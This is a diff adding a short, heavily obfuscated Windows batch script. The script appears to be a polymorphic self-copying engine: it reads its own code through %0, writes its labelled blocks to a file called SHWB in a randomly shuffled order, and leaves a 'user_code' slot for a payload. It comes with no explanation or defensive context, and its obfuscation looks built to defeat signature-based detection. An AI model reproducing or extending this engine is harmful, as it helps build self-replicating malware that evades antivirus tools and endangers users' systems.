@@ -1,0 +1,27 @@
+:aaa
+%aaa% set #=$
+%aaa% Echo.>SHWB
+%aaa% set U=I
+%aaa% GoTo bb%x%b
+:bbb
+%bbb% IF NoT %#%==$ goto aa%x%a
+%bbb% set T=O
+%bbb% %U%F %Random% LSS %random% (call :ee%x%e a%x%aa cc%x%c F) ELSE (call :ee%x%e c%x%cc aa%x%a F)
+%bbb% G%T%T%T% cc%x%c
+:ccc
+%ccc% IF NoT %#%==$ goto aa%x%a
+%ccc% %U%F %Random% LSS %random% (call :e%x%ee dd%x%d ee%x%e F) ELSE (call :e%x%ee e%x%ee dd%x%d F)
+%ccc% G%T%T%T% dd%x%d
+:ddd
+%ddd% IF NoT %#%==$ goto aa%x%a
+%ddd% %U%F %Random% LSS %random% (call :e%x%ee bb%x%b ff%x%f F) ELSE (call :ee%x%e ff%x%f bb%x%b F)
+%ddd% G%T%T%T% ff%x%f
+:eee
+%eee% IF NoT %#%==$ goto aa%x%a
+%eee% %3IND "%1"<%0>>SHWB
+%eee% %3IND "%2"<%0>>SHWB
+exit /b %eee%
+:fff
+%fff% IF NoT %#%==$ goto aa%x%a
+%fff%  user_code
+%fff% 
